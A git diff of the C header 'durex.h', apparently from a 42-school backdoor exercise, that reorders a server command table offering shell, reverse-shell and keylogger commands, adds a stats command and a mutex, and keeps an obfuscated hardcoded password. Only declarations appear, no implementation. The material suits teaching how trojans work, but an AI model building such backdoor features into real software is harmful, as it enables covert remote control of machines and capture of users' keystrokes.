@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   durex.h                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
+/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2018/09/27 09:34:01 by root             ###   ########.fr       */
+/*   Updated: 2019/05/12 17:50:41 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -29,13 +29,13 @@
 # define SERVER_KEYLOG_PORT "1212"
 # define SERVER_CLIENT_MAX	3
 # define SERVER_CLIENT_BUFF	128
-# define SERVER_COMMANDS	{ "?"     , NULL    , "Display this help."   , &serverHelp       , NULL },\
-							{ "shell" , NULL    , "Open a shell."        , &serverShell      , NULL },\
-							{ "rshell", "[port]", "Open a reverse shell.", &serverRemoteShell, NULL },\
-							{ "keylog", "[port]", "Open a keylogger."    , &serverKeylogger  , NULL },\
-							{ "logs"  , NULL    , "Print logs"           , &serverPrintLogs  , NULL },\
-							{ "quit"  , NULL    , "Quit server."         , &serverQuitClient , NULL },\
-							{ NULL, NULL, NULL, NULL, NULL }
+# define SERVER_COMMANDS	{ "?"     , NULL    , "Display this help."   , serverHelp       , NULL },\
+							{ "log"   , NULL    , "Print logs"           , serverPrintLogs  , NULL },\
+							{ "stat"  , NULL    , "Print stats"          , serverPrintStats , NULL },\
+							{ "keylog", "[port]", "Open a keylogger."    , serverKeylogger  , NULL },\
+							{ "rshell", "[port]", "Open a reverse shell.", serverRemoteShell, NULL },\
+							{ "shell" , NULL    , "Open a shell."        , serverShell      , NULL },\
+							{ "quit"  , NULL    , "Quit server."         , serverQuitClient , NULL },
 # define SERVER_PASS		201, 121, 30, 74, 3, 83, 154, 250 /* kata */
 
 typedef struct	s_buff
@@ -59,11 +59,12 @@ typedef struct	s_cl
 
 typedef struct	s_sv
 {
-	int			reporter;
-	int			fd;
-	fd_set		fdr;
-	fd_set		fdw;
-	t_cl		client[SERVER_CLIENT_MAX];
+	int				reporter;
+	pthread_mutex_t	mutex;
+	int				fd;
+	fd_set			fdr;
+	fd_set			fdw;
+	t_cl			client[SERVER_CLIENT_MAX];
 }				t_sv;
 
 typedef struct	s_cmd
@@ -92,6 +93,7 @@ void			serverRemoteShell(t_cl *client, t_cmd *cmds);
 void			serverKeylogger(t_cl *client, t_cmd *cmds);
 int				serverInitKeylogger(int socket);
 void			serverPrintLogs(t_cl *client, t_cmd *cmds);
+void			serverPrintStats(t_cl *client, t_cmd *cmds);
 void			serverQuitClient(t_cl *client, t_cmd *cmds);
 void			quitClearlyServer();
 void			clearClient(t_cl *client);
@@ -102,7 +104,7 @@ void			clientWrite(const char *str, t_cl *client);
 void			clientShell(int fds);
 
 int				hireReporter();
-void			serverLog(const char *message, ...);
+void			serverLog(int ts, const char *message, ...);
 
 void			encryptFunction(unsigned char *msg, size_t size);
 char			*moveTail(char *ptr, char *buff, int buff_size);
